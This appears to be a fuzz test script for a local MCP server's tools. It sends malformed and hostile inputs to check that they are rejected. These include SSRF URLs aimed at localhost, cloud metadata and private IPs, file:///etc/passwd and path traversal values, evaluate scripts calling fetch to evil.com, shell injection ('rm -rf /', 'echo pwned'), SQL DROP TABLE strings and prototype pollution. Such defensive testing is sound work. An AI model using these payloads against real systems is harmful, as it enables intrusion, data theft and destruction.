import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const KEY = "dummy";

async function makeClient() {
  const t = new StdioClientTransport({
    command: "node",
    args: ["/Users/tongwu/Projects/novada-mcp/build/index.js"],
    env: Object.assign({}, process.env, { NOVADA_API_KEY: KEY })
  });
  const c = new Client({ name: "qa-fuzz", version: "0" }, { capabilities: {} });
  await c.connect(t);
  return { client: c };
}

async function callTool(client, name, args) {
  try {
    const r = await client.callTool({ name, arguments: args });
    return { ok: !r.isError, isError: !!r.isError, text: (r.content?.[0]?.text ?? "") };
  } catch(e) {
    return { ok: false, isError: true, text: String(e), threw: true };
  }
}

const results = [];

async function run() {
  const { client } = await makeClient();

  async function t(testId, tool, args) {
    const r = await callTool(client, tool, args);
    results.push({ test: testId, tool, isError: r.isError, text: r.text.slice(0, 500) });
  }

  // === SEARCH BOUNDARY TESTS ===
  await t("T01_query_integer", "novada_search", { query: 42 });
  await t("T02_query_null", "novada_search", { query: null });
  await t("T03_query_empty", "novada_search", { query: "" });
  await t("T04_query_whitespace", "novada_search", { query: "   " });
  await t("T05_query_501chars", "novada_search", { query: "x".repeat(501) });
  await t("T06_query_500chars_boundary", "novada_search", { query: "x".repeat(500) });
  await t("T07_num_negative", "novada_search", { query: "test", num: -1 });
  await t("T08_num_zero", "novada_search", { query: "test", num: 0 });
  await t("T09_num_21_above_max", "novada_search", { query: "test", num: 21 });
  await t("T10_num_int_overflow", "novada_search", { query: "test", num: 2147483648 });
  await t("T11_num_float", "novada_search", { query: "test", num: 1.5 });
  await t("T12_num_string_coercion", "novada_search", { query: "test", num: "5" });
  await t("T13_engine_invalid", "novada_search", { query: "test", engine: "firefox" });
  await t("T14_engine_null", "novada_search", { query: "test", engine: null });
  await t("T15_time_range_invalid", "novada_search", { query: "test", time_range: "invalid" });
  await t("T16_include_domains_11", "novada_search", { query: "test", include_domains: Array(11).fill("example.com") });
  await t("T17_project_name_31chars", "novada_search", { query: "test", project: "a".repeat(31) });
  await t("T18_no_query_field", "novada_search", {});
  await t("T19_extra_unknown_keys", "novada_search", { query: "test", extra_key: "value", __proto__: { admin: true } });

  // === EXTRACT BOUNDARY TESTS ===
  await t("T20_extract_no_url", "novada_extract", { format: "markdown", render: "auto" });
  await t("T21_ssrf_localhost", "novada_extract", { url: "http://localhost:8080/secret", format: "markdown", render: "auto" });
  await t("T22_ssrf_metadata", "novada_extract", { url: "http://169.254.169.254/latest/meta-data/", format: "markdown", render: "auto" });
  await t("T23_file_scheme", "novada_extract", { url: "file:///etc/passwd", format: "markdown", render: "auto" });
  await t("T24_max_chars_999_below_min", "novada_extract", { url: "https://example.com", max_chars: 999, format: "markdown", render: "auto" });
  await t("T25_max_chars_100001_above_max", "novada_extract", { url: "https://example.com", max_chars: 100001, format: "markdown", render: "auto" });
  await t("T26_url_array_11_above_max", "novada_extract", { url: Array(11).fill("https://example.com"), format: "markdown", render: "auto" });
  await t("T27_render_invalid_value", "novada_extract", { url: "https://example.com", render: "flash", format: "markdown" });
  await t("T28_format_invalid_value", "novada_extract", { url: "https://example.com", render: "auto", format: "xml" });
  await t("T29_wait_ms_above_max", "novada_extract", { url: "https://example.com", render: "auto", format: "markdown", wait_ms: 30001 });
  await t("T30_wait_ms_negative", "novada_extract", { url: "https://example.com", render: "auto", format: "markdown", wait_ms: -1 });
  await t("T31_url_newline_injection", "novada_extract", { url: "https://example.com\nGET /evil HTTP/1.1", render: "auto", format: "markdown" });
  await t("T32_url_private_192_168", "novada_extract", { url: "http://192.168.1.1/admin", format: "markdown", render: "auto" });
  await t("T33_url_private_10_0_0_1", "novada_extract", { url: "http://10.0.0.1/secret", format: "markdown", render: "auto" });
  await t("T34_fields_21_items", "novada_extract", { url: "https://example.com", render: "auto", format: "markdown", fields: Array(21).fill("price") });
  await t("T35_url_array_invalid_member", "novada_extract", { url: ["https://example.com", "not-a-url", "https://example.org"], format: "markdown", render: "auto" });

  // === BROWSER EVALUATE SECURITY ===
  await t("T36_evaluate_fetch_blocked", "novada_browser", { actions: [{ action: "evaluate", script: "fetch('https://evil.com/data')" }], timeout: 60000 });
  await t("T37_evaluate_xhr_blocked", "novada_browser", { actions: [{ action: "evaluate", script: "new XMLHttpRequest()" }], timeout: 60000 });
  await t("T38_evaluate_eval_blocked", "novada_browser", { actions: [{ action: "evaluate", script: "eval('1+1')" }], timeout: 60000 });
  await t("T39_evaluate_function_blocked", "novada_browser", { actions: [{ action: "evaluate", script: "new Function('return 1')()" }], timeout: 60000 });
  await t("T40_evaluate_window_bracket_blocked", "novada_browser", { actions: [{ action: "evaluate", script: "window['fetch']('http://evil.com')" }], timeout: 60000 });
  await t("T41_evaluate_script_too_long", "novada_browser", { actions: [{ action: "evaluate", script: "x".repeat(2001) }], timeout: 60000 });
  await t("T42_evaluate_non_ascii", "novada_browser", { actions: [{ action: "evaluate", script: "document.title + '⚠️'" }], timeout: 60000 });
  await t("T43_browser_actions_empty", "novada_browser", { actions: [], timeout: 60000 });
  await t("T44_browser_actions_21", "novada_browser", { actions: Array(21).fill({ action: "screenshot" }), timeout: 60000 });
  await t("T45_browser_session_id_traversal", "novada_browser", { actions: [{ action: "screenshot" }], session_id: "../../evil/../session", timeout: 60000 });
  await t("T46_browser_country_3chars", "novada_browser", { actions: [{ action: "screenshot" }], country: "usa", timeout: 60000 });
  await t("T47_browser_close_session_combined", "novada_browser", { actions: [{ action: "close_session" }, { action: "screenshot" }], timeout: 60000 });
  await t("T48_browser_navigate_private_ip", "novada_browser", { actions: [{ action: "navigate", url: "http://10.0.0.1/secret", wait_until: "domcontentloaded" }], timeout: 60000 });

  // === PROXY BOUNDARIES ===
  await t("T49_proxy_session_id_traversal", "novada_proxy", { type: "residential", format: "url", session_id: "../../admin" });
  await t("T50_proxy_city_injection", "novada_proxy", { type: "residential", format: "url", city: "London; rm -rf /", country: "gb" });
  await t("T51_proxy_city_sql_injection", "novada_proxy_residential", { format: "url", city: "New York'; DROP TABLE--", country: "us" });

  // === SCRAPE BOUNDARIES ===
  await t("T52_scrape_operation_injection", "novada_scrape", { platform: "amazon.com", operation: "amazon_product; DROP TABLE--", params: {} });
  await t("T53_scrape_platform_injection", "novada_scrape", { platform: "amazon.com; echo pwned", operation: "amazon_product_keywords", params: {} });
  await t("T54_scrape_limit_101", "novada_scrape", { platform: "amazon.com", operation: "amazon_product_keywords", params: { keyword: "test" }, limit: 101 });

  // === SCRAPER STATUS/RESULT TASK_ID VALIDATION ===
  await t("T55_scraper_status_path_traversal", "novada_scraper_status", { task_id: "../../etc/passwd" });
  await t("T56_scraper_result_sql_injection", "novada_scraper_result", { task_id: "1'; DROP TABLE tasks--" });
  await t("T57_scraper_status_empty_task_id", "novada_scraper_status", { task_id: "" });

  // === RESEARCH/VERIFY/UNBLOCK ===
  await t("T58_research_no_question_no_query", "novada_research", { depth: "quick" });
  await t("T59_research_question_too_short", "novada_research", { question: "hi" });
  await t("T60_verify_claim_too_short", "novada_verify", { claim: "short" });
  await t("T61_unblock_timeout_below_min", "novada_unblock", { url: "https://example.com", method: "render", timeout: 4999 });
  await t("T62_unblock_timeout_above_max", "novada_unblock", { url: "https://example.com", method: "render", timeout: 120001 });
  await t("T63_unblock_max_chars_below_min", "novada_unblock", { url: "https://example.com", method: "render", timeout: 30000, max_chars: 999 });
  await t("T64_unblock_max_chars_above_max", "novada_unblock", { url: "https://example.com", method: "render", timeout: 30000, max_chars: 500001 });

  // === CRAWL BOUNDARIES ===
  await t("T65_crawl_max_pages_21", "novada_crawl", { url: "https://example.com", max_pages: 21, strategy: "bfs", render: "auto" });
  await t("T66_crawl_max_pages_0", "novada_crawl", { url: "https://example.com", max_pages: 0, strategy: "bfs", render: "auto" });

  // === MAP BOUNDARIES ===
  await t("T67_map_limit_101", "novada_map", { url: "https://example.com", limit: 101 });
  await t("T68_map_max_depth_6", "novada_map", { url: "https://example.com", limit: 10, max_depth: 6 });

  await client.close();
  return results;
}

run().then(results => {
  console.log(JSON.stringify(results, null, 2));
}).catch(err => {
  console.error("Fatal:", err);
  process.exit(1);
});

// Additional SSRF tests for browser_flow 
// These should be run after the main test suite
